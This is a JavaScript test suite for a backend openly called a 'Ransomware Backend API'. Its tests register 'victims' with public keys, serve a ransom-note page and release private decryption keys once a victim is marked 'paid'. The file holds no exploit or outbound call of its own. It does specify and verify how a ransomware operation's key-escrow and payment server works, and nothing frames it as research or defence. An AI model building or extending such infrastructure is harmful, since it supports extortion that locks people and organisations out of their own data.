const request = require('supertest');
const app = require('../index');
const fs = require('fs');
const path = require('path');
const db = require('../db/database');

const DB_FILE = path.join(__dirname, '../db/victims.json');

describe('Ransomware Backend API', () => {
    let testVictimId;

    beforeAll(() => {
        // Clear DB for tests
        if (fs.existsSync(DB_FILE)) {
            fs.writeFileSync(DB_FILE, JSON.stringify([]));
        }
    });

    it('POST /api/register should return a victimId and public key', async () => {
        const res = await request(app).post('/api/register');
        
        expect(res.statusCode).toEqual(201);
        expect(res.body).toHaveProperty('victimId');
        expect(res.body).toHaveProperty('publicKey');
        expect(res.body.publicKey).toMatch(/BEGIN PUBLIC KEY/);

        testVictimId = res.body.victimId;
    });

    it('GET /api/ransom/:victimId should return the ransom note HTML', async () => {
        // We mock the html file so the test passes without the actual views dir
        const viewsDir = path.join(__dirname, '../views');
        if (!fs.existsSync(viewsDir)) {
            fs.mkdirSync(viewsDir, { recursive: true });
        }
        fs.writeFileSync(path.join(viewsDir, 'ransom.html'), '<html>{{VICTIM_ID}}</html>');

        const res = await request(app).get(`/api/ransom/${testVictimId}`);
        
        expect(res.statusCode).toEqual(200);
        expect(res.text).toContain(testVictimId);
    });

    it('POST /api/decrypt-key/:victimId should return the private key', async () => {
        const res = await request(app).post(`/api/decrypt-key/${testVictimId}`);
        
        expect(res.statusCode).toEqual(200);
        expect(res.body).toHaveProperty('privateKey');
        expect(res.body.privateKey).toMatch(/BEGIN PRIVATE KEY/);
        
        // Verify DB updated
        const victim = db.getVictim(testVictimId);
        expect(victim.paid).toBe(true);
    });
});
